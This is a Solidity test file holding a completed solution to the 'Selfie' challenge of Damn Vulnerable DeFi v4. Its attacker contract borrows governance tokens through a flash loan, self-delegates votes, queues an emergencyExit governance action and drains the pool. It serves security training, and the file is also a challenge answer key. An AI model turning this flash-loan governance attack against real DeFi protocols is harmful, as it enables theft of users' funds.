// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity >=0.8.25 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * Attacker contract for the Selfie challenge
 */
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableVotes private token;
    address private player;
    uint256 private actionId;

    constructor(address _pool, address _governance, address _token, address _player) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        player = _player;
    }

    function attack() external {
        // Calculate how many tokens we need to borrow to have majority voting power
        uint256 amountToBorrow = pool.maxFlashLoan(address(token));
        
        // Execute flash loan
        pool.flashLoan(
            this,
            address(token),
            amountToBorrow,
            abi.encode(amountToBorrow)
        );
        
        // After 2 days, the queued action can be executed
        // This would happen in a separate transaction
    }
    
    function executeAction() external {
        governance.executeAction(actionId);
    }

    /**
     * Flash loan callback function
     */
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // During the flash loan, we temporarily hold the tokens
        // Delegate votes to ourselves to get voting power
        token.delegate(address(this));
        
        // Queue a governance action to drain the pool
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            player
        );
        
        actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        
        // Approve returning the tokens to the pool
        token.approve(address(pool), amount);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // Create an attacker contract
        SelfieAttacker attacker = new SelfieAttacker(
            address(pool),
            address(governance),
            address(token),
            recovery
        );
        
        // Start the attack
        attacker.attack();
        
        // Advance time by 2 days so the governance action can be executed
        vm.warp(block.timestamp + 2 days + 1);
        
        // Execute the governance action
        attacker.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
